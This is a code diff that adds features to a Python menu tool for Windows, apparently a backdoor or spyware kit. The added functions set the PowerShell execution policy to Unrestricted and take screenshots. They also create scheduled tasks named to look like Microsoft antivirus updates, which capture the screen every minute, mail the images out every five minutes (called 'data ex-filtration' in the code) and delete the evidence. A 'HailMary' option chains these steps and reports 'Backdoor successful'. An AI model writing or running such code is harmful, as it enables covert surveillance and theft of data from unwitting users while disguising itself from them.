@@ -35,7 +35,6 @@ OPTIONS = '''
 9. Exit
 '''
 
-# menu function
 def menu():
 	while True:
 		try:
@@ -45,14 +44,79 @@ def menu():
 			if choice[0] == 'n':
 				sys.exit(0)
 				break
-
 		except ValueError:
 			sys.exit(0)
 
-# check host is using windows or not
 def checkHostWindows():
 	if os.name == "nt":
-		print ('[+] All good...')
+		print ('[+] All good....')
 	else:
-		print('[!= Please run the application on windows machine ')
+		print ('[!] Please run the application on Windows machine')
 		sys.exit(0)
+
+def cmd_exectionPolicy():
+
+	process=subprocess.Popen(["powershell","Set-ExecutionPolicy Unrestricted"], shell=False);
+	result=process.communicate()[0]
+	print(result)
+	print ("Execution Policy is now set to unrestricted...")
+	
+def cmd_takeScreenshot():
+
+	process=subprocess.Popen(["powershell","Shoot.ps1"], shell=False);
+	result1=process.communicate()[0]
+	print(result1)
+	print ("ScreenShot taken successfully...")
+
+def cmd_ScreenShotTaskScheduler():
+
+	process=subprocess.Popen(["powershell","schtasks /create /sc minute /mo 1 /tn MicrosoftAntiVirusCriticalUpdatesCore /tr C:\Python36\Shoot.vbs"], shell=False);
+	result2=process.communicate()[0]
+	print(result2)
+	print ("Task scheduled successfully...")
+
+def cmd_sendMail():
+	
+	process=subprocess.Popen(["powershell","Mail.ps1"], shell=False);
+	result3=process.communicate()[0]
+	print(result3)
+	
+
+def cmd_MailTaskScheduler():
+	
+	process=subprocess.Popen(["powershell","schtasks /create /sc minute /mo 5 /tn MicrosoftAntiVirusCriticalUpdatesUA /tr C:\Python36\Mail.vbs"], shell=False);
+	result4=process.communicate()[0]
+	print(result4)
+	print ("Task for data ex-filtration scheduled successfully...")
+	
+def cmd_deleteScreenShot():
+	
+	process=subprocess.Popen(["powershell","Remove-Item $env:USERPROFILE\Documents\ScreenShot\*.*"], shell=False);
+	result5=process.communicate()[0]
+	print(result5)
+	print ("All files deleted successfully...")
+	
+def cmd_deleteTaskScheduler():
+	
+	process=subprocess.Popen(["powershell","schtasks /create /sc minute /mo 12 /tn MicrosoftAntiVirusCriticalUpdatesDF /tr C:\Python36\delScreenShot.vbs"], shell=False);
+	result6=process.communicate()[0]
+	print(result6)
+	print ("Task for deleting data scheduled successfully...")
+	
+def cmd_HailMary():
+	cmd_ScreenShotTaskScheduler()
+	cmd_MailTaskScheduler()
+	cmd_deleteTaskScheduler()
+	print ("Backdoor successful...")
+		
+cmds = {
+	"1" : cmd_exectionPolicy,
+	"2" : cmd_takeScreenshot,
+	"3" : cmd_ScreenShotTaskScheduler,
+	"4" : cmd_sendMail,
+	"5" : cmd_MailTaskScheduler,
+	"6" : cmd_deleteScreenShot,
+	"7" : cmd_deleteTaskScheduler,
+	"8" : cmd_HailMary,
+	"9" : lambda: sys.exit(0)
+}
